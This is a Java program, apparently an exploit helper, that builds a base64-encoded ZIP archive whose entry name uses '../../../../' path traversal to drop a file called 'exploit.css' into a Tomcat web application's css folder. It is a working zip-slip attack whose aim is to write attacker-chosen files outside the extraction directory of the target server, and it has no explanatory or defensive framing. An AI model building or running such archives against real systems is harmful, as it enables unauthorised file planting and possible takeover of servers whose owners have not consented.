import java.util.zip.ZipOutputStream;
import java.util.zip.ZipEntry;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.File;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import java.io.FileWriter;
import java.io.BufferedWriter;

// files are created in : /mi/tomcat/temp/[UUID]

class genZip {


    public static byte[] readFile(String filename) {
        File file = new File(filename);
        byte[] bytes = new byte[(int) file.length()];
        try(FileInputStream fis = new FileInputStream(file)) {
            fis.read(bytes);
            return bytes;
        } catch (Exception e) {
            System.out.println("Failed to read file " + filename);
            System.out.println(e);
            return "".getBytes();
        }
    }

    public static void main(String[] args) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream outzip = new ZipOutputStream(baos); 
        String root_dir = "../../../../";
        String mifs_root_dir = root_dir + "mi/tomcat/webapps/mifs/css/";

        String[] files = {"exploit.css"};
        
        try {
            for (String filename : files) {
                outzip.putNextEntry(new ZipEntry(mifs_root_dir + filename));
                byte[] data = readFile("./zipit/"+filename);
                outzip.write(data, 0, data.length);
                System.out.println("Added " + filename + " - len="+data.length);
            }
            outzip.close();

            String outzip_b64 = new String(Base64.getEncoder().encodeToString(baos.toByteArray()));
            System.out.println(outzip_b64);
            BufferedWriter writer = new BufferedWriter(new FileWriter("./genZip.out"));
            writer.write(outzip_b64);
            writer.close();
        } catch (Exception e) {

        }
    }
}